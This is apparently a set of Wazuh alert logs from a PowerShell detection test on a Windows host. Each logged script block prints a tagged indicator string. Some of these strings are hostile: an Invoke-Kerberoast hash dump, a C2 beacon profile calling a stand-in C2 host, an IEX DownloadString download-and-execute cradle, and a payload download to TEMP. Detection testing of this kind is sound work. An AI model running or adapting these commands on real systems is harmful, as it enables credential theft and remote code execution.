{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d6774af6-ba7b-4fe7-b4ca-870675cddb06","scriptBlockText":"$sampleId='PST-282'; $parts=@('Invoke-K','erberoa','st -O','utput','Format H','ashcat | Se','lect-Obj','ect SamAcc','ountN','ame,Hash'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723809","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-282'; $parts=@('Invoke-K','erberoa','st -O','utput','Format H','ashcat | Se','lect-Obj','ect SamAcc','ountN','ame,Hash'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d6774af6-ba7b-4fe7-b4ca-870675cddb06\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:43.6993616Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:43.6993616Z\",\"eventRecordID\":\"723809\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-282'; $parts=@('Invoke-K','erberoa','st -O','utput','Format H','ashcat | Se','lect-Obj','ect SamAcc','ountN','ame,Hash'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d6774af6-ba7b-4fe7-b4ca-870675cddb06\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-282'; $parts=@('Invoke-K','erberoa','st -O','utput','Format H','ashcat | Se','lect-Obj','ect SamAcc','ountN','ame,Hash'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d6774af6-ba7b-4fe7-b4ca-870675cddb06\"}}}","id":"1784281064.592585","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:44.284+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"cf0df548-47e3-4467-8fe6-9cc1f0ac9b0f","scriptBlockText":"$sampleId='PST-283'; $parts=@('$profilE=@{S','lEep=60000',';JIttEr=0.25;Us','ERAgent=''','moZilLa/5.0'';u','Ri=''/aPi/V1/','Stat`us''};',' INV`OkE-webrEQ','uEsT -uRi ''hTT','pS://C2.EXa','MplE.InvaL`','ID/aPi/V1/StA`Tu','s'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723811","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-283'; $parts=@('$profilE=@{S','lEep=60000',';JIttEr=0.25;Us','ERAgent=''','moZilLa/5.0'';u','Ri=''/aPi/V1/','Stat`us''};',' INV`OkE-webrEQ','uEsT -uRi ''hTT','pS://C2.EXa','MplE.InvaL`','ID/aPi/V1/StA`Tu','s'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: cf0df548-47e3-4467-8fe6-9cc1f0ac9b0f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:44.0240396Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:44.0240396Z\",\"eventRecordID\":\"723811\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-283'; $parts=@('$profilE=@{S','lEep=60000',';JIttEr=0.25;Us','ERAgent=''','moZilLa/5.0'';u','Ri=''/aPi/V1/','Stat`us''};',' INV`OkE-webrEQ','uEsT -uRi ''hTT','pS://C2.EXa','MplE.InvaL`','ID/aPi/V1/StA`Tu','s'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: cf0df548-47e3-4467-8fe6-9cc1f0ac9b0f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-283'; $parts=@('$profilE=@{S','lEep=60000',';JIttEr=0.25;Us','ERAgent=''','moZilLa/5.0'';u','Ri=''/aPi/V1/','Stat`us''};',' INV`OkE-webrEQ','uEsT -uRi ''hTT','pS://C2.EXa','MplE.InvaL`','ID/aPi/V1/StA`Tu','s'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"cf0df548-47e3-4467-8fe6-9cc1f0ac9b0f\"}}}","id":"1784281064.592585","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:44.301+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a14cce52-eefb-4f70-a61a-e0c4b8c98b5f","scriptBlockText":"$sampleId='PST-284'; [xml]'&lt;config&gt;&lt;mode&gt;audit&lt;/mode&gt;&lt;/config&gt;' | Select-Object -ExpandProperty config; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723814","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-284'; [xml]'<config><mode>audit</mode></config>' | Select-Object -ExpandProperty config; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a14cce52-eefb-4f70-a61a-e0c4b8c98b5f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:44.3635165Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:44.3635165Z\",\"eventRecordID\":\"723814\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-284'; [xml]'<config><mode>audit</mode></config>' | Select-Object -ExpandProperty config; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a14cce52-eefb-4f70-a61a-e0c4b8c98b5f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-284'; [xml]'&lt;config&gt;&lt;mode&gt;audit&lt;/mode&gt;&lt;/config&gt;' | Select-Object -ExpandProperty config; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a14cce52-eefb-4f70-a61a-e0c4b8c98b5f\"}}}","id":"1784281065.592585","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:45.228+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a869047f-6f9a-4138-a0de-4bca8d3e853b","scriptBlockText":"$sampleId='PST-285'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723818","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-285'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a869047f-6f9a-4138-a0de-4bca8d3e853b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:44.7018320Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:44.7018320Z\",\"eventRecordID\":\"723818\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-285'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a869047f-6f9a-4138-a0de-4bca8d3e853b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-285'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a869047f-6f9a-4138-a0de-4bca8d3e853b\"}}}","id":"1784281065.592585","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:45.234+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"2817bd7e-6a85-401c-b602-a1c0473fb513","scriptBlockText":"$sampleId='PST-286'; $parts=@('IEX (Ne','w-Obj','ect Net.W','ebClient',').DownloadSt','ring(''','https:','//stag','e.example.inv','alid/bootstr','ap.ps1'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723820","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-286'; $parts=@('IEX (Ne','w-Obj','ect Net.W','ebClient',').DownloadSt','ring(''','https:','//stag','e.example.inv','alid/bootstr','ap.ps1'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 2817bd7e-6a85-401c-b602-a1c0473fb513\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:45.0469829Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:45.0469829Z\",\"eventRecordID\":\"723820\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-286'; $parts=@('IEX (Ne','w-Obj','ect Net.W','ebClient',').DownloadSt','ring(''','https:','//stag','e.example.inv','alid/bootstr','ap.ps1'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 2817bd7e-6a85-401c-b602-a1c0473fb513\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-286'; $parts=@('IEX (Ne','w-Obj','ect Net.W','ebClient',').DownloadSt','ring(''','https:','//stag','e.example.inv','alid/bootstr','ap.ps1'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"2817bd7e-6a85-401c-b602-a1c0473fb513\"}}}","id":"1784281065.595445","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","firedtimes":9,"groups":["windows"," powershell"],"id":"91837","level":4,"mail":false,"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"timestamp":"2026-07-17T11:37:45.271+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"7706f2bf-5835-4104-b760-e6fc02158fe6","scriptBlockText":"$sampleId='PST-287'; $indicator='Invoke-WebRequest -Uri ''https://files.example.invalid/update.bin'' -OutFile ''$env:TEMP\\\\update.bin'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723823","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-287'; $indicator='Invoke-WebRequest -Uri ''https://files.example.invalid/update.bin'' -OutFile ''$env:TEMP\\update.bin'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 7706f2bf-5835-4104-b760-e6fc02158fe6\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:45.3817867Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:45.3817867Z\",\"eventRecordID\":\"723823\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-287'; $indicator='Invoke-WebRequest -Uri ''https://files.example.invalid/update.bin'' -OutFile ''$env:TEMP\\\\update.bin'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 7706f2bf-5835-4104-b760-e6fc02158fe6\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-287'; $indicator='Invoke-WebRequest -Uri ''https://files.example.invalid/update.bin'' -OutFile ''$env:TEMP\\\\\\\\update.bin'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"7706f2bf-5835-4104-b760-e6fc02158fe6\"}}}","id":"1784281066.598214","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":24,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:37:46.335+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"482463a4-a3c3-4bd9-b16c-4240389b22eb","scriptBlockText":"$sampleId='PST-288'; Get-Printer -ErrorAction SilentlyContinue | Select-Object -First 5 Name, DriverName; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723826","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-288'; Get-Printer -ErrorAction SilentlyContinue | Select-Object -First 5 Name, DriverName; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 482463a4-a3c3-4bd9-b16c-4240389b22eb\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:45.7096521Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:45.7096521Z\",\"eventRecordID\":\"723826\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-288'; Get-Printer -ErrorAction SilentlyContinue | Select-Object -First 5 Name, DriverName; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 482463a4-a3c3-4bd9-b16c-4240389b22eb\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-288'; Get-Printer -ErrorAction SilentlyContinue | Select-Object -First 5 Name, DriverName; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"482463a4-a3c3-4bd9-b16c-4240389b22eb\"}}}","id":"1784281066.598214","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:46.342+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a0c76815-84a6-414f-b133-4ed34f69bbc6","scriptBlockText":"$sampleId='PST-289'; Get-CimInstance Win32_QuickFixEngineering | Select-Object -First 5 HotFixID, Description; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723841","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-289'; Get-CimInstance Win32_QuickFixEngineering | Select-Object -First 5 HotFixID, Description; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a0c76815-84a6-414f-b133-4ed34f69bbc6\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:46.0579241Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:46.0579241Z\",\"eventRecordID\":\"723841\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-289'; Get-CimInstance Win32_QuickFixEngineering | Select-Object -First 5 HotFixID, Description; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a0c76815-84a6-414f-b133-4ed34f69bbc6\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-289'; Get-CimInstance Win32_QuickFixEngineering | Select-Object -First 5 HotFixID, Description; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a0c76815-84a6-414f-b133-4ed34f69bbc6\"}}}","id":"1784281066.598214","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:46.453+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"6498da8f-a9dc-4fe8-b1a7-28a0844b8e95","scriptBlockText":"$sampleId='PST-290'; Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 5 Entry, Data; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723871","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-290'; Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 5 Entry, Data; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 6498da8f-a9dc-4fe8-b1a7-28a0844b8e95\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:48.8972203Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:48.8972203Z\",\"eventRecordID\":\"723871\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-290'; Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 5 Entry, Data; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 6498da8f-a9dc-4fe8-b1a7-28a0844b8e95\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-290'; Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 5 Entry, Data; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"6498da8f-a9dc-4fe8-b1a7-28a0844b8e95\"}}}","id":"1784281069.598214","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:49.669+0200"}
